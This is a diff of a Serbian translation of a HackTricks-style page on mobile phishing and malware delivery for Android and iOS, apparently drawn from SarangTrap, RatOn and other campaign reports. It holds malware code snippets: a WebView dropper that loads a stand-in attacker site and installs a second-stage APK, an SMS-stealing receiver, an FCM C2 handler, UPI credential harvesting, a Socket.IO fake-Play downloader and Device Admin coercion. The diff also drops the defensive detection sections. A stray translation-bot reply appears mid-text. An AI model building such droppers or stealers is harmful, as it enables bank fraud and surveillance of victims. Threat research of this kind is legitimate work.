@@ -1,26 +1,26 @@
-# Mobile Phishing & Malicious App Distribution (Android & iOS)
+# Mobile Phishing & Distribucija zlonamernih aplikacija (Android & iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> Ova stranica obuhvata tehnike koje koriste threat actors za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishing (SEO, social engineering, fake stores, dating apps, itd.).
-> Materijal je adaptiran iz kampanje SarangTrap otkrivene od strane Zimperium zLabs (2025) i drugih javno dostupnih istraživanja.
+> Ova stranica obuhvata tehnike koje koriste napadači za distribuciju **malicious Android APKs** i **iOS mobile-configuration profiles** putem phishinga (SEO, social engineering, lažne prodavnice, aplikacije za upoznavanje, itd.).
+> Materijal je prilagođen iz kampanje SarangTrap otkrivene od strane Zimperium zLabs (2025) i drugih javnih istraživanja.
 
 ## Tok napada
 
-1. **SEO/Phishing Infrastructure**
-* Registrujte desetine sličnih domena (dating, cloud share, car service…).
-– Koristite ključne reči na lokalnom jeziku i emotikone u `<title>` elementu da se rangirate na Google.
-– Hostujte na istoj landing stranici uputstva za instalaciju za Android (`.apk`) i iOS.
-2. **First Stage Download**
-* Android: direktan link do *unsigned* ili “third-party store” APK-a.
-* iOS: `itms-services://` ili običan HTTPS link ka malicioznom **mobileconfig** profilu (vidi dole).
+1. **SEO/Phishing infrastruktura**
+* Registrujte desetine sličnih domena (aplikacije za upoznavanje, deljenje u cloudu, servis za automobile…).
+– Koristite ključne reči na lokalnom jeziku i emojije u `<title>` elementu da biste se rangirali na Google.
+– Hostujte oba Android (`.apk`) i iOS uputstva za instalaciju na istoj odredišnoj stranici.
+2. **Preuzimanje prve faze**
+* Android: direktan link do *unsigned* ili „third-party store“ APK-a.
+* iOS: `itms-services://` ili običan HTTPS link do zlonamernog **mobileconfig** profila (vidi dole).
 3. **Post-install Social Engineering**
-* Pri prvom pokretanju aplikacija traži **invitation / verification code** (iluzija ekskluzivnog pristupa).
-* Kod se **POSTed over HTTP** na Command-and-Control (C2).
+* Pri prvom pokretanju aplikacija traži **pozivni / verifikacioni kod** (iluzija ekskluzivnog pristupa).
+* Kod se **POSTuje preko HTTP-a** na Command-and-Control (C2).
 * C2 odgovara `{"success":true}` ➜ malware nastavlja.
-* Sandbox / AV dinamička analiza koja nikada ne pošalje validan kod ne uoči **maliciozno ponašanje** (evasion).
-4. **Runtime Permission Abuse** (Android)
+* Sandbox / AV dinamička analiza koja nikada ne pošalje validan kod ne uoči **zlonamerno ponašanje** (evasion).
+4. **Zloupotreba runtime dozvola (Android)**
 * Opasne dozvole se traže tek **nakon pozitivnog odgovora C2**:
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -28,43 +28,39 @@
 <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 <!-- Older builds also asked for SMS permissions -->
 ```
-* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod koji čita SMS preko reflection ⇒ snižava statički score dok i dalje funkcioniše na uređajima koji daju dozvolu preko `AppOps` abuse ili starih ciljeva.
-5. **Facade UI & Background Collection**
-* Aplikacija prikazuje bezopasne view-e (SMS viewer, gallery picker) implementirane lokalno.
-* U međuvremenu eksfiltrira:
+* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali ostavljaju Java/Kotlin kod koji čita SMS preko reflection ⇒ smanjuje statički skor dok i dalje funkcioniše na uređajima koji dodeljuju dozvolu preko `AppOps` zloupotrebe ili starih ciljeva.
+5. **Fasadni UI & prikupljanje u pozadini**
+* Aplikacija prikazuje bezopasne prikaze (SMS viewer, gallery picker) implementirane lokalno.
+* U međuvremenu exfiltrira:
 - IMEI / IMSI, broj telefona
-- Potpuni `ContactsContract` dump (JSON array)
-- JPEG/PNG iz `/sdcard/DCIM` kompresovano pomoću [Luban](https://github.com/Curzibn/Luban) da se smanji veličina
-- Opcioni sadržaj SMS-a (`content://sms`)
+- Potpuni `ContactsContract` dump (JSON niz)
+- JPEG/PNG iz `/sdcard/DCIM` kompresovan sa [Luban](https://github.com/Curzibn/Luban) radi smanjenja veličine
+- Opcionalno SMS sadržaj (`content://sms`)
 Payloads su **batch-zipped** i šalju se putem `HTTP POST /upload.php`.
-6. **iOS Delivery Technique**
-* Jedan **mobile-configuration profile** može zahtevati `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da upiše uređaj u nadzor sličan “MDM”.
-* Social-engineering uputstva:
+6. **iOS metoda isporuke**
+* Jedan **mobile-configuration profile** može zatražiti `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. kako bi upisao/registrovao uređaj u nadzor sličan “MDM”.
+* Uputstva za social-engineering:
 1. Otvorite Settings ➜ *Profile downloaded*.
-2. Tapnite *Install* tri puta (screenshot-ovi na phishing stranici).
-3. Trust the unsigned profile ➜ napadač dobija *Contacts* & *Photo* entitlement bez App Store pregleda.
-7. **Network Layer**
-* Običan HTTP, često na portu 80 sa HOST headerom kao `api.<phishingdomain>.com`.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS-a → lako primetiti).
+2. Tapnite *Install* tri puta (screenshot-i na phishing stranici).
+3. Trust-ujte nepotpisani profil ➜ napadač dobija *Contacts* i *Photo* entitlement bez App Store revizije.
+7. **Mrežni sloj**
+* Obični HTTP, često na portu 80 sa HOST headerom kao `api.<phishingdomain>.com`.
+* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (bez TLS → lako za uočiti).
 
-## Defensive Testing / Red-Team Tips
+## Red-Team saveti
 
-* **Dynamic Analysis Bypass** – Tokom procene malware-a, automatizujte fazu invitation code koristeći Frida/Objection da dođete do malicioznog branch-a.
-* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostatak opasnih permisija je crvena zastavica.
-* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da otkrijete neobične POST burst-ove nakon unosa koda.
-* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS-u da izlistate `PayloadContent` i uočite prekomerne entitlements.
+* **Dynamic Analysis Bypass** – Tokom procene malware-a, automatizujte fazu pozivnog koda pomoću Frida/Objection da biste dostigli zlonamerni branch.
+* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; nedostatak opasnih dozvola je crvena zastavica.
+* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da biste detektovali neobične nagle POST zahteve nakon unosa koda.
+* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS da izlistate `PayloadContent` i uočite prekomerne entitlements.
 
-## Blue-Team Detection Ideas
+## Koristan Frida snippet: automatsko zaobilaženje pozivnog koda
 
-* **Certificate Transparency / DNS Analytics** za hvatanje naglih izbijanja domena bogatih ključnim rečima.
-* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` od Dalvik klijenata van Google Play.
-* **Invite-code Telemetry** – POST 6–8 cifrenih numeričkih kodova ubrzo nakon instalacije APK-a može ukazivati na staging.
-* **MobileConfig Signing** – Blokirajte unsigned configuration profile putem MDM politike.
-
-## Koristan Frida Snippet: Auto-Bypass Invitation Code
-```python
-# frida -U -f com.badapp.android -l bypass.js --no-pause
-# Hook HttpURLConnection write to always return success
+<details>
+<summary>Frida: automatsko zaobilaženje pozivnog koda</summary>
+```javascript
+// frida -U -f com.badapp.android -l bypass.js --no-pause
+// Hook HttpURLConnection write to always return success
 Java.perform(function() {
 var URL = Java.use('java.net.URL');
 URL.openConnection.implementation = function() {
@@ -80,7 +76,9 @@ return conn;
 };
 });
 ```
-## Indikatori (Generički)
+</details>
+
+## Indikatori (generički)
 ```
 /req/checkCode.php        # invite code validation
 /upload.php               # batched ZIP exfiltration
@@ -90,16 +88,16 @@ LubanCompress 1.1.8       # "Luban" string inside classes.dex
 
 ## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
 
-Ovaj obrazac primećen je u kampanjama koje zloupotrebljavaju teme državnih pomoći kako bi ukrali indijske UPI kredencijale i OTP-ove. Operateri povezuju ugledne platforme radi isporuke i otpornosti.
+Ovaj obrazac je primećen u kampanjama koje zloupotrebljavaju teme državnih pogodnosti kako bi ukrale indijske UPI kredencijale i OTP-ove. Operateri povezuju ugledne platforme radi isporuke i otpornosti.
 
-### Delivery chain across trusted platforms
-- YouTube video lure → opis sadrži skraćeni link
-- Skraćeni link → GitHub Pages phishing sajt koji imituje legitimni portal
-- Isti GitHub repo hostuje APK sa lažnom “Google Play” oznakom koja direktno vodi do fajla
-- Dinamičke phishing stranice hostovane na Replit; daljinski kanal komandi koristi Firebase Cloud Messaging (FCM)
+### Lanac isporuke preko pouzdanih platformi
+- YouTube video-mamac → opis sadrži skraćeni link
+- Skraćeni link → GitHub Pages phishing site koji imituje pravi portal
+- Isti GitHub repo hostuje APK sa lažnom “Google Play” oznakom koja linkuje direktno na fajl
+- Dinamične phishing stranice žive na Replit; kanal za udaljene komande koristi Firebase Cloud Messaging (FCM)
 
-### Dropper with embedded payload and offline install
-- Prvi APK je installer (dropper) koji isporučuje stvarni malware u `assets/app.apk` i traži od korisnika da isključi Wi‑Fi/mobilne podatke kako bi umanjio detekciju u cloudu.
+### Dropper sa ugrađenim payloadom i offline instalacijom
+- Prvi APK je installer (dropper) koji isporučuje stvarni malware u `assets/app.apk` i traži od korisnika da isključi Wi‑Fi/mobile data kako bi umanjio cloud detection.
 - Ugrađeni payload se instalira pod bezazlenim nazivom (npr. “Secure Update”). Nakon instalacije, i installer i payload su prisutni kao odvojene aplikacije.
 
 Static triage tip (grep for embedded payloads):
@@ -108,10 +106,10 @@ unzip -l sample.apk | grep -i "assets/app.apk"
 # Or:
 zipgrep -i "classes|.apk" sample.apk | head
 ```
-### Dinamičko otkrivanje endpoint-a putem shortlink
-- Malware preuzima plain-text, comma-separated list live endpoints sa shortlink; simple string transforms proizvode finalni phishing page path.
+### Dynamic endpoint discovery via shortlink
+- Malware preuzima plain-text, komama razdvojenu listu aktivnih endpoints sa shortlinka; jednostavne transformacije stringova proizvode krajnji phishing page path.
 
-Primer (sanitizovano):
+Example (sanitised):
 ```
 GET https://rebrand.ly/dclinkto2
 Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
@@ -127,8 +125,8 @@ String upiPage = parts[0].replace("gate.html", "gate.htm");
 String smsPost = parts[1];
 String credsPost = upiPage.replace("gate.htm", "addup.php");
 ```
-### WebView-based UPI credential harvesting
-- Korak “Make payment of ₹1 / UPI‑Lite” učitava zlonamerni HTML formular sa dinamičkog endpointa unutar WebView-a i hvata osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.
+### Sakupljanje UPI kredencijala zasnovano na WebView
+- Korak “Make payment of ₹1 / UPI‑Lite” učitava napadačev HTML formular sa dinamičkog endpointa unutar WebView-a i beleži osetljiva polja (telefon, banka, UPI PIN) koja se `POST`uju na `addup.php`.
 
 Minimal loader:
 ```java
@@ -136,18 +134,18 @@ WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
 wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 ```
-### Self-propagation and SMS/OTP interception
-- Agresivne dozvole se traže pri prvom pokretanju:
+### Samopropagacija i presretanje SMS/OTP
+- Prilikom prvog pokretanja zahtevaju se agresivne dozvole:
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
 <uses-permission android:name="android.permission.SEND_SMS"/>
 <uses-permission android:name="android.permission.READ_SMS"/>
 <uses-permission android:name="android.permission.CALL_PHONE"/>
 ```
-- Kontakti se u petlji koriste za masovno slanje smishing SMS sa uređaja žrtve.
-- Dolazne SMS poruke se presreću broadcast receiver-om i otpremaju sa metapodacima (pošiljalac, telo poruke, SIM slot, nasumični ID po uređaju) na `/addsm.php`.
+- Kontakti se u petlji koriste za masovno slanje smishing SMS-ova sa uređaja žrtve.
+- Dolazni SMS se presreću pomoću broadcast receiver-a i otpremaju zajedno sa metapodacima (sender, body, SIM slot, per-device random ID) na `/addsm.php`.
 
-Receiver sketch:
+Skica receiver-a:
 ```java
 public void onReceive(Context c, Intent i){
 SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
@@ -161,10 +159,10 @@ postForm(urlAddSms, new FormBody.Builder()
 }
 }
 ```
-### Firebase Cloud Messaging (FCM) as resilient C2
-- Payload se registruje na FCM; push messages nose `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr., update phishing text templates, toggle behaviours).
+### Firebase Cloud Messaging (FCM) kao otporan C2
+- Payload se registruje na FCM; push poruke sadrže `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr. ažuriranje phishing tekstualnih šablona, prebacivanje ponašanja).
 
-Primer FCM payload:
+Example FCM payload:
 ```json
 {
 "to": "<device_fcm_token>",
@@ -174,7 +172,7 @@ Primer FCM payload:
 }
 }
 ```
-Skica handlera:
+Skica Handlera:
 ```java
 @Override
 public void onMessageReceived(RemoteMessage msg){
@@ -186,27 +184,24 @@ case "smish": sendSmishToContacts(); break;
 }
 }
 ```
-### Obrasci otkrivanja i indikatori kompromitovanja (IOCs)
+### Indikatori/IOCs
 - APK sadrži sekundarni payload u `assets/app.apk`
 - WebView učitava payment iz `gate.htm` i eksfiltrira na `/addup.php`
 - SMS eksfiltracija na `/addsm.php`
-- Preuzimanje konfiguracije pokrenuto shortlinkom (npr. `rebrand.ly/*`) koje vraća CSV endpoint-e
+- Preuzimanje konfiguracije preko shortlink-a (npr. `rebrand.ly/*`) koje vraća CSV endpoints
 - Aplikacije označene kao generičke “Update/Secure Update”
-- FCM `data` poruke sa `_type` diskriminatorom u nepouzdanim aplikacijama
-
-### Ideje za detekciju i odbranu
-- Označiti aplikacije koje upute korisnike da isključe mrežu tokom instalacije, a zatim side-loaduju drugi APK iz `assets/`.
-- Upozoriti na kombinaciju permisija: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
-- Monitoring izlaznog saobraćaja za `POST /addup.php|/addsm.php` na nekorporativnim hostovima; blokirati poznatu infrastrukturu.
-- Mobile EDR pravila: nepouzdana aplikacija koja se registruje za FCM i grananje po `_type` polju.
+- FCM `data` poruke sa `_type` discriminator-om u nepouzdanim aplikacijama
 
 ---
 
-## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+## Socket.IO/WebSocket zasnovan APK Smuggling i lažne Google Play stranice
 
-Napadači sve češće zamenjuju statičke APK linkove Socket.IO/WebSocket kanalom ugrađenim u namame koje izgledaju kao Google Play. Ovo skriva payload URL, zaobilazi URL/extension filtre i održava realističan install UX.
+Napadači sve češće zamenjuju statične APK linkove Socket.IO/WebSocket kanalom ugrađenim u mamce koji liče na Google Play. Ovo skriva URL payload-a, zaobilazi filtere URL/ekstenzija i održava realističan UX instalacije.
 
-Tipičan tok klijenta zabeležen u realnom svetu:
+Tipičan tok klijenta zabeležen u prirodi:
+
+<details>
+<summary>Socket.IO lažni Play downloader (JavaScript)</summary>
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -226,17 +221,14 @@ a.href = url; a.download = "app.apk"; a.style.display = "none";
 document.body.appendChild(a); a.click();
 });
 ```
+</details>
+
 Zašto zaobilazi jednostavne kontrole:
-- Nije izložen statički APK URL; payload se rekonstruše u memoriji iz WebSocket frames.
-- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane putem WebSockets/Socket.IO.
-- Crawleri i URL sandboxes koji ne izvršavaju WebSockets neće preuzeti payload.
+- Nije izložen statički APK URL; payload se rekonstruiše u memoriji iz WebSocket frames.
+- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane preko WebSockets/Socket.IO.
+- Crawlers i URL sandboxes koji ne izvršavaju WebSockets neće preuzeti payload.
 
-Ideje za otkrivanje i detekciju:
-- Web/network telemetrija: označiti WebSocket sesije koje prenose velike binarne delove, nakon čega sledi kreiranje Blob-a sa MIME application/vnd.android.package-archive i programatski `<a download>` klik. Tražite klijentske stringove kao socket.emit('startDownload'), i događaje imenovane chunk, downloadProgress, downloadComplete u skriptama stranice.
-- Play-store spoof heuristike: na domenima koji nisu Google i koji serviraju Play-like stranice, tražite Google Play UI stringove kao http.html:"VfPpkd-jY41G-V67aGc", mešovite jezičke template-e, i lažne “verification/progress” tokove pokretane WS događajima.
-- Kontrole: blokirajte isporuku APK-a sa porekla koja nisu Google; primenite MIME/extension politike koje obuhvataju WebSocket saobraćaj; očuvajte browser safe-download prompte.
-
-See also WebSocket tradecraft and tooling:
+Pogledajte i WebSocket tradecraft i tooling:
 
 {{#ref}}
 ../../pentesting-web/websocket-attacks.md
@@ -245,12 +237,15 @@ See also WebSocket tradecraft and tooling:
 
 ## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn studija slučaja
 
-Kampanja RatOn banker/RAT (ThreatFabric) je konkretan primer kako moderne mobile phishing operacije kombinuju WebView droppere, Accessibility-driven UI automatizaciju, overlays/ransom, Device Admin prinudu, Automated Transfer System (ATS), preuzimanje crypto wallet-a, pa čak i NFC-relay orkestraciju. Ovaj odeljak apstrahuje ponovo upotrebljive tehnike.
+Kampanja RatOn banker/RAT (ThreatFabric) je konkretan primer kako moderne mobile phishing operacije kombinuju WebView droppere, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, pa čak i NFC-relay orchestration. Ovaj odeljak apstrahuje ponovo upotrebljive tehnike.
 
 ### Stage-1: WebView → native install bridge (dropper)
-Napadači prikažu WebView koji pokazuje na napadačevu stranicu i injektuju JavaScript interfejs koji izlaže native installer. Tap na HTML dugme poziva native kod koji instalira second-stage APK uključen u dropper-ove assets i zatim ga direktno pokreće.
+Napadači prikažu WebView koji pokazuje na napadačevu stranicu i ubacuju JavaScript interfejs koji izlaže native installer. Dodir na HTML dugme poziva native kod koji instalira second-stage APK smešten u assets droppera i zatim ga direktno pokreće.
 
 Minimalni obrazac:
+
+<details>
+<summary>Stage-1 dropper minimal pattern (Java)</summary>
 ```java
 public class DropperActivity extends Activity {
 @Override protected void onCreate(Bundle b){
@@ -279,23 +274,23 @@ wv.loadUrl("https://attacker.site/install.html");
 }
 }
 ```
-Molim vas nalepite HTML sadržaj stranice koji želite da prevedem.
+Niste priložili HTML stranice. Pošaljite sadržaj (HTML/markdown) koji treba da prevedem, pa ću uraditi prevod na srpski uz zadržavanje svih tagova i linkova.
 ```html
 <button onclick="bridge.installApk()">Install</button>
 ```
-Nakon instalacije, dropper pokreće payload putem eksplicitnog package/activity:
+Nakon instalacije, dropper pokreće payload putem explicit package/activity:
 ```java
 Intent i = new Intent();
 i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
 startActivity(i);
 ```
-Hunting idea: nepouzdane aplikacije koje pozivaju `addJavascriptInterface()` i izlažu metode nalik installeru u WebView; APK koji isporučuje ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.
+Ideja za otkrivanje: nepouzdane aplikacije koje pozivaju `addJavascriptInterface()` i izlažu metode slične installeru WebView-u; APK koji u paketu sadrži ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.
 
-### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
-Stage-2 otvara WebView koji hostuje stranicu “Access”. Njeno dugme poziva exported method koja navede žrtvu na Accessibility settings i zahteva omogućavanje rogue service. Kada se to odobri, malware koristi Accessibility da automatski klikne kroz naredne runtime dijaloge za dozvole (contacts, overlay, manage system settings, itd.) i zahteva Device Admin.
+### Tok pristanka: Accessibility + Device Admin + naknadni runtime upiti
+Stage-2 otvara WebView koji hostuje stranicu “Access”. Njen dugme poziva exportovanu metodu koja navodi žrtvu na Accessibility podešavanja i zahteva uključivanje zlonamerne usluge. Nakon odobrenja, malware koristi Accessibility da automatski klikne kroz naredne runtime dijaloge za dozvole (contacts, overlay, manage system settings, itd.) i traži Device Admin.
 
-- Accessibility programski pomaže prihvatiti kasnije promptove tako što pronalazi dugmad kao “Allow”/“OK” u node-tree i simulira klikove.
-- Overlay permission check/request:
+- Accessibility programatski pomaže prihvatiti kasnije promptove tako što pronalazi dugmad poput “Allow”/“OK” u stablu čvorova i simulira klikove.
+- Provera/zahtjev overlay dozvole:
 ```java
 if (!Settings.canDrawOverlays(ctx)) {
 Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -309,21 +304,21 @@ Vidi takođe:
 ../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
 {{#endref}}
 
-### Overlay phishing/ransom via WebView
+### Overlay phishing/iznuda putem WebView
 Operatori mogu izdavati komande za:
-- prikaz overlay-a preko celog ekrana sa URL-a, ili
-- prosleđivanje inline HTML-a koji se učitava u WebView overlay.
+- prikazivanje overlay-a preko celog ekrana sa URL-a, ili
+- prosleđivanje inline HTML koje se učitava u WebView overlay.
 
-Verovatne upotrebe: prisila (PIN entry), otvaranje wallet-a da bi se presreli PINs, ransom messaging. Zadržati komandu koja osigurava da je dozvola za overlay dodeljena ukoliko nedostaje.
+Moguće upotrebe: prisila (unos PIN-a), otvaranje wallet-a da bi se uhvatili PIN-ovi, poruke za iznudu. Obezbediti komandu koja proverava i traži dozvolu za overlay ako nije dodeljena.
 
-### Remote control model – text pseudo-screen + screen-cast
-- Low-bandwidth: periodično dump-ovati Accessibility node tree, serializovati vidljive texts/roles/bounds i poslati na C2 kao pseudo-screen (komande kao `txt_screen` jednom i `screen_live` kontinuirano).
-- High-fidelity: zatražiti MediaProjection i pokrenuti screen-casting/recording po potrebi (komande kao `display` / `record`).
+### Remote control model – tekstualni pseudo-ekran + screen-cast
+- Niska propusnost: periodično dump-ovati Accessibility node tree, serijalizovati vidljive tekstove/uloge/koordinate i poslati ih C2 kao pseudo-ekran (komande poput `txt_screen` jednom i `screen_live` kontinuirano).
+- Velika vernost: zahtevati MediaProjection i pokrenuti screen-casting/snimanje na zahtev (komande kao `display` / `record`).
 
-### ATS playbook (bank app automation)
-Na osnovu JSON zadatka, otvoriti bank app, upravljati UI preko Accessibility koristeći kombinaciju text queries i coordinate taps, i uneti payment PIN žrtve kada bude zatraženo.
+### ATS playbook (automacija bankovne aplikacije)
+Na osnovu JSON zadatka, otvoriti bank app, upravljati UI preko Accessibility koristeći kombinaciju tekstualnih upita i tapova po koordinatama, i uneti platni PIN žrtve kada se to zatraži.
 
-Primer zadatka:
+Example task:
 ```json
 {
 "cmd": "transfer",
@@ -333,8 +328,8 @@ Primer zadatka:
 "name": "ACME"
 }
 ```
-Primeri tekstova viđenih u jednom ciljanom toku (CZ → EN):
-- "Nová platba" → "Nova uplata"
+Example texts seen in one target flow (CZ → EN):
+- "Nová platba" → "Novo plaćanje"
 - "Zadat platbu" → "Unesi uplatu"
 - "Nový příjemce" → "Novi primalac"
 - "Domácí číslo účtu" → "Domaći broj računa"
@@ -344,54 +339,111 @@ Primeri tekstova viđenih u jednom ciljanom toku (CZ → EN):
 - "Zaplatit" → "Plati"
 - "Hotovo" → "Gotovo"
 
-Operatori takođe mogu proveravati/povećavati limite transfera putem komandi kao `check_limit` i `limit` koje na sličan način navigiraju UI za limite.
+Operatori mogu takođe proveravati/povećavati limite prenosa putem komandi kao `check_limit` i `limit` koje na sličan način navigiraju kroz interfejs za limite.
 
-### Ekstrakcija seed fraze kripto novčanika
-Ciljevi kao MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: otključavanje (ukradeni PIN ili dostavljena lozinka), navigacija do Security/Recovery, otkriti/prikazati seed frazu, keylog/exfiltrate it. Implementirati selektore osetljive na lokalizaciju (EN/RU/CZ/SK) kako bi se stabilizovala navigacija kroz jezike.
+### Crypto wallet seed extraction
+Ciljevi uključuju MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: otključavanje (ukradeni PIN ili dostavljena lozinka), navigacija do Security/Recovery, otkriti/prikazati seed phrase, keylog/exfiltrate it. Implementirajte selektore osetljive na lokalizaciju (EN/RU/CZ/SK) kako biste stabilizovali navigaciju kroz jezike.
 
-### Prisila Device Admin-a
-Device Admin APIs se koriste za povećanje mogućnosti hvatanja PIN-a i frustriranje žrtve:
+### Device Admin coercion
+Device Admin APIs se koriste za povećanje mogućnosti za PIN-capture i za frustriranje žrtve:
 
-- Momentalno zaključavanje:
+- Neposredno zaključavanje:
 ```java
 dpm.lockNow();
 ```
-- Isteknite trenutne kredencijale da primorate promenu (Accessibility hvata novi PIN/lozinku):
+- Isteknite trenutni credential da biste prisilili promenu (Accessibility beleži novi PIN/password):
 ```java
 dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
 ```
-- Primorajte otključavanje bez biometrije onemogućavanjem biometrijskih funkcija keyguard-a:
+- Primorajte otključavanje bez biometrijske autentifikacije onemogućavanjem biometrijskih funkcija keyguard-a:
 ```java
 dpm.setKeyguardDisabledFeatures(admin,
 DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
 DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
 ```
-Napomena: Mnoge DevicePolicyManager kontrole zahtevaju Device Owner/Profile Owner na novijim verzijama Androida; neki OEM buildovi mogu biti popustljivi. Uvek validirajte na ciljnom OS/OEM.
+Napomena: Mnogi DevicePolicyManager controls zahtevaju Device Owner/Profile Owner na novijim Android uređajima; neke OEM verzije mogu biti popustljive. Uvek verifikujte na ciljanom OS/OEM.
 
-### NFC relay orchestration (NFSkate)
-Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu proslediti HTML šablon koji vodi žrtvu tokom relay-a. Ovo omogućava contactless card-present cash-out pored online ATS.
+### Orkestracija NFC relay (NFSkate)
+Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu proslediti HTML šablon da vodi žrtvu tokom relay-a. Ovo omogućava contactless card-present cash-out pored online ATS.
 
-Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
+Pozadina: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
 
-### Operator command set (sample)
-- UI/state: `txt_screen`, `screen_live`, `display`, `record`
-- Social: `send_push`, `Facebook`, `WhatsApp`
-- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
-- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
+### Skup komandi operatora (primer)
+- UI/stanje: `txt_screen`, `screen_live`, `display`, `record`
+- Socijalno: `send_push`, `Facebook`, `WhatsApp`
+- Overlay-i: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
+- Novčanici: `metamask`, `trust`, `blockchain`, `phantom`
 - ATS: `transfer`, `check_limit`, `limit`
-- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
-- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
+- Uređaj: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
+- Komunikacija/izvidjanje: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
 - NFC: `nfs`, `nfs_inject`
 
-### Ideje za detekciju i odbranu (RatOn-style)
-- Pronađite WebView-ove koji koriste `addJavascriptInterface()` i izlažu metode instalera/dozvola; stranice koje se završavaju sa “/access” i pokreću Accessibility promptove.
-- Upozorite na aplikacije koje generišu visokofrekventne Accessibility geste/klikove ubrzo nakon dobijanja pristupa servisu; telemetrija koja liči na Accessibility node dump-ove poslate na C2.
-- Pratite promene Device Admin politika u nepouzdanim aplikacijama: `lockNow`, isteka lozinke, prekidači keyguard funkcionalnosti.
-- Upozorite na MediaProjection promptove iz nekorporativnih aplikacija koji su praćeni periodičnim upload-ovima frejmova.
-- Detektujte instalaciju/pokretanje eksternog NFC-relay app-a koje je pokrenula druga aplikacija.
-- Za bankarstvo: primenjujte out-of-band potvrde, vezivanje za biometriju i ograničenja transakcija otporna na automatizaciju na uređaju.
+### Anti-detekcija ATS zasnovana na Accessibility: ljudska kadenica teksta i dvostruka injekcija teksta (Herodotus)
+
+Napadači sve češće mešaju automatizaciju zasnovanu na Accessibility sa anti-detekcijom podešenom protiv osnovne biometrije ponašanja. Jedan noviji banker/RAT pokazuje dva komplementarna režima isporuke teksta i prekidač operatera za simulaciju ljudskog kucanja sa nasumičnom kadencom.
+
+- Režim otkrivanja: enumeriše vidljive node-ove koristeći selectors i bounds da precizno cilja input polja (ID, text, contentDescription, hint, bounds) pre nego što deluje.
+- Dvostruka injekcija teksta:
+- Mod 1 – `ACTION_SET_TEXT` direktno na ciljnom node-u (stabilno, bez keyboard-a);
+- Mod 2 – postavljanje clipboard-a + `ACTION_PASTE` u fokusirani node (radi kada je direktno setText blokirano).
+- Ljudska kadenica: podelite string koji obezbeđuje operater i isporučite ga karakter-po-karakter sa nasumičnim kašnjenjima od 300–3000 ms između događaja da bi se izbegle heuristike „machine-speed typing“. Implementirano ili postepenim povećavanjem vrednosti putem `ACTION_SET_TEXT`, ili lepljenjem po jednom karakteru.
+
+<details>
+<summary>Java skica: node discovery + delayed per-char input via setText or clipboard+paste</summary>
+```java
